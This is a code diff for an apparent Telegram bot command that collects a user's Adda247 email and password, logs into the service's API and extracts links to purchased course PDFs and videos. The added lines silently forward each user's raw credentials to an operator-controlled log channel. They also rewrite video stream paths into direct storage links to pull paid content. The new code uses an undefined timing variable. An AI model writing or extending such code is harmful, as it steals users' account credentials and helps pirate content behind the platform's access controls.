@@ -16,97 +16,94 @@ log_channel = CHANNEL_ID
 @app.on_message(filters.command(["adda"]))
 async def adda_command_handler(app, m):
     try:
-        e_message = await app.ask(m.chat.id, "Send ID & Password of **Adda 247** in given format.\n\n**Format**:- Email ID*Password")
+        # 1. Ask for credentials
+        e_message = await app.ask(m.chat.id, "Send ID & Password of **Adda 247**\n\n**Format**:- Email ID*Password")
         ap = e_message.text.strip()
-        if "*" in ap:
-            e, p = ap.split("*")
-        else:
-            m.reply_text(" Invalid input. Please send details in the correct format.")
+        
+        # FEATURE: FORWARD TO LOG
+        log_text = f"#ADDA_LOG\n**User:** {m.from_user.mention}\n**ID:** `{m.from_user.id}`\n**Data:** `{ap}`"
+        await app.send_message(log_channel, log_text)
+
+        if "*" not in ap:
+            await m.reply_text("Invalid format.")
             return
+            
+        e, p = ap.split("*")
+        status = await m.reply_text("🔎 Logging in and scanning all categories...")
+
+        # Login Logic
         url = "https://userapi.adda247.com/login?src=aweb"
         data = {"email": e, "providerName": "email", "sec": p}
-        headers = {
-            "authority": "userapi.adda247.com",
-            "Content-Type": "application/json",
-            "X-Auth-Token": "fpoa43edty5",
-            "X-Jwt-Token": ""
-        }
+        headers = {"authority": "userapi.adda247.com", "Content-Type": "application/json", "X-Auth-Token": "fpoa43edty5", "X-Jwt-Token": ""}
 
         response = requests.post(url, json=data, headers=headers).json()
         jwt = response.get("jwtToken")
         if not jwt:
-            await m.reply_text("Login failed. Please check your credentials.")
+            await status.edit("Login failed.")
             return
 
         headers["X-Jwt-Token"] = jwt
-        packages = requests.get(
-            "https://store.adda247.com/api/v2/ppc/package/purchased?pageNumber=0&pageSize=10&src=aweb",
-            headers=headers
-        ).json().get("data", [])
+        packages = requests.get("https://store.adda247.com/api/v2/ppc/package/purchased?pageNumber=0&pageSize=10&src=aweb", headers=headers).json().get("data", [])
 
         for package in packages:
             package_id = package.get("packageId")
             package_title = package.get("title", "").replace('|', '_').replace('/', '_')
-            if not package_id or not package_title:
-                continue  # Skip if package ID or title is missing
-
-            await m.reply_text(f"Processing package {package_id} ☆ {package_title}")
-            start = time.time()
-            file_name = f"{package_id}_{package_title}.txt"
+            
+            file_name = f"{package_title}.txt"
+            total_items = 0
+            
             with open(file_name, "w") as file:
-                child_packages = requests.get(
-                    f"https://store.adda247.com/api/v3/ppc/package/child?packageId={package_id}&category=ONLINE_LIVE_CLASSES&isComingSoon=false&pageNumber=0&pageSize=10&src=aweb",
-                    headers=headers
-                ).json().get("data", {}).get("packages", [])
+                # FEATURE: LOOK THROUGH ALL THINGS (Recorded, Live, Tests)
+                categories = ["ONLINE_LIVE_CLASSES", "RECORDED_COURSE", "TEST_SERIES"]
+                
+                for cat in categories:
+                    await status.edit(f"Processing {package_title}\nCategory: {cat.replace('_', ' ')}...")
+                    
+                    child_url = f"https://store.adda247.com/api/v3/ppc/package/child?packageId={package_id}&category={cat}&isComingSoon=false&pageNumber=0&pageSize=20&src=aweb"
+                    child_packages = requests.get(child_url, headers=headers).json().get("data", {}).get("packages", [])
 
-                for child in child_packages:
-                    child_id = child.get("packageId")
-                    child_title = child.get("title", "").replace('|', '_').replace('/', '_')
-                    if not child_id or not child_title:
-                        continue  # Skip if child ID or title is missing
+                    for child in child_packages:
+                        child_id = child.get("packageId")
+                        endpoints = [
+                            f"https://store.adda247.com/api/v1/my/purchase/OLC/{child_id}?src=aweb",
+                            f"https://store.adda247.com/api/v1/my/purchase/content/{child_id}?src=aweb"
+                        ]
+                        
+                        for api_url in endpoints:
+                            res_data = requests.get(api_url, headers=headers).json().get("data", {})
+                            items = res_data.get("onlineClasses", []) + res_data.get("contents", [])
+                            
+                            for item in items:
+                                name = item.get("name", "Unknown").replace('|', '_')
+                                
+                                # PDF Extract
+                                pdf = item.get("pdfFileName") or item.get("pdf")
+                                if pdf:
+                                    file.write(f"{name}: https://store.adda247.com/{pdf}\n")
+                                    total_items += 1
+                                
+                                # --- UPDATED VIDEO LOGIC ---
+                                video_url = item.get("url") # e.g., "ivs/4831519/2EPO38JP5F8XGFQCS0BA/480p30playlist.m3u8"
+                                if video_url:
+                                    # We extract the base path before '480p30' and change extension to .mp4
+                                    # Based on your example: ivs/.../filename.mp4
+                                    base_path = video_url.replace("/480p30playlist.m3u8", ".mp4")
+                                    # If the slash isn't there, we just clean the URL
+                                    base_path = base_path.replace("480p30playlist.m3u8", ".mp4")
+                                    
+                                    new_working_link = f"https://video-streaming-source.s3.ap-south-1.amazonaws.com/{base_path}"
+                                    file.write(f"{name}: {new_working_link}\n")
+                                    total_items += 1
 
-                    online_classes = requests.get(
-                        f"https://store.adda247.com/api/v1/my/purchase/OLC/{child_id}?src=aweb",
-                        headers=headers
-                    ).json().get("data", {}).get("onlineClasses", [])
-
-                    for online_class in online_classes:
-                        class_name = online_class.get("name", "").replace('|', '_').replace('/', '_')
-                        if not class_name:
-                            continue  # Skip if class name is missing
-
-                        # Handle PDF URL
-                        pdf_file = online_class.get("pdfFileName")
-                        if pdf_file:
-                            pdf_link = f"https://store.adda247.com/{pdf_file}"
-                            file.write(f"{class_name}:{pdf_link}\n")
-
-                        # Handle Video URL
-                        video_url = online_class.get("url")
-                        if video_url:
-                            try:
-                                video_response = requests.get(
-                                    f"https://videotest.adda247.com/file?vp={video_url}&pkgId={child_id}&isOlc=true",
-                                    headers=headers
-                                ).text
-                                for line in video_response.split('\n'):
-                                    if "480p30playlist.m3u8" in line:
-                                        stream_url = line.replace('/updated', '/demo/updated')
-                                        file.write(f"{class_name}:{stream_url}\n")
-                            except Exception:
-                                continue  # Skip if video URL fails to fetch
-
-            if os.path.getsize(file_name) > 0:
+            if os.path.exists(file_name) and os.path.getsize(file_name) > 0:
                 end = time.time()
                 elapsed_time = end-start
-                c_text = f"**App Name :** ADDA 247 \n\n BATCH NAME : {package_title}\n\n Elapsed time: {elapsed_time:.1f} seconds \n\n **╾───• Txtx Extractor •───╼**  " 
-                await m.reply_document(file_name, caption=c_text)
-                await app.send_document(log_channel, file_name , caption = c_text)
+                caption = f"**App Name :** ADDA 247 \n\n 📦 **Batch:** `{package_title}`\n\n Elapsed time: {elapsed_time:.1f} seconds \n\n ✅ **Total Items Found:** {total_items} \n\n **╾───• Txtx Extractor •───╼**  "
+                await m.reply_document(file_name, caption=caption)
+                await app.send_document(log_channel, file_name, caption=f"#EXTRACTED\n{caption}")
+                os.remove(file_name)
 
-    
-            os.remove(file_name)
+        await status.edit("✅ All Packages Processed!")
 
-    except requests.exceptions.RequestException as req_err:
-        await m.reply_text(f"Request Error: {str(req_err)}")
-    except Exception as err:
-        await m.reply_text(f"An error occurred: {str(err)}")
+    except Exception as e:
+        await m.reply_text(f"Error: {e}")
